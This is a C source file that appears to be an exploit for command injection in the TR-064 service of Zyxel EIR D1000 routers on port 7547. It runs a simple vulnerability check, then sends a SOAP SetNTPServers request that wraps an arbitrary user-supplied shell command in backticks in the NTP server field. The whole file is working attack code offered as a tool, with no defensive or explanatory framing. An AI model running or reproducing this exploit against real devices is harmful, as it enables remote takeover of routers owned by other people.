// "Zyxel EIR D1000

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 8192
#define TARGET_PORT 7547

// Function to create an HTTP POST request
void create_http_post_request(const char *target_ip, const char *cmd, char *request, size_t request_size) {
    snprintf(request, request_size,
             "POST /UD/act?1 HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Type: text/xml\r\n"
             "SOAPAction: \"urn:dslforum-org:service:Time:1#SetNTPServers\"\r\n"
             "Connection: close\r\n"
             "Content-Length: %lu\r\n\r\n"
             "<?xml version=\"1.0\"?>"
             "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
             " <SOAP-ENV:Body>"
             "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">"
             "   <NewNTPServer1>`%s`</NewNTPServer1>"
             "   <NewNTPServer2></NewNTPServer2>"
             "   <NewNTPServer3></NewNTPServer3>"
             "   <NewNTPServer4></NewNTPServer4>"
             "   <NewNTPServer5></NewNTPServer5>"
             "  </u:SetNTPServers>"
             " </SOAP-ENV:Body>"
             "</SOAP-ENV:Envelope>",
             target_ip, strlen(cmd) + 250, cmd); // Adjusting content length accordingly
}

// Function to send an HTTP POST request and receive the response
int send_http_post_request(const char *target_ip, const char *cmd) {
    int sock;
    struct sockaddr_in server_addr;
    char request[2048];
    char response[MAX_RESPONSE_SIZE];
    int bytes_received;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set up server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Create and send the HTTP POST request
    create_http_post_request(target_ip, cmd, request, sizeof(request));
    send(sock, request, strlen(request), 0);

    // Receive the response
    memset(response, 0, sizeof(response));
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    return bytes_received;
}

// Function to check if the target is vulnerable
int check_vulnerability(const char *target_ip) {
    char response[MAX_RESPONSE_SIZE];
    char request[256];

    snprintf(request, sizeof(request), "GET /globe HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", target_ip);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 0; // Not vulnerable
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 0; // Not vulnerable
    }

    send(sock, request, strlen(request), 0);
    memset(response, 0, sizeof(response));
    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    close(sock);

    if (bytes_received < 0) {
        perror("Receive failed");
        return 0; // Not vulnerable
    }

    response[bytes_received] = '\0'; // Null-terminate the response
    if (strstr(response, "home_wan.htm") != NULL) {
        return 1; // Target is vulnerable
    }

    return 0; // Target is not vulnerable
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <command>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1]; // Target IP from command line argument
    const char *cmd = argv[2]; // Command to execute from command line argument

    if (check_vulnerability(target_ip)) {
        send_http_post_request(target_ip, cmd);
    }

    return EXIT_SUCCESS;
}
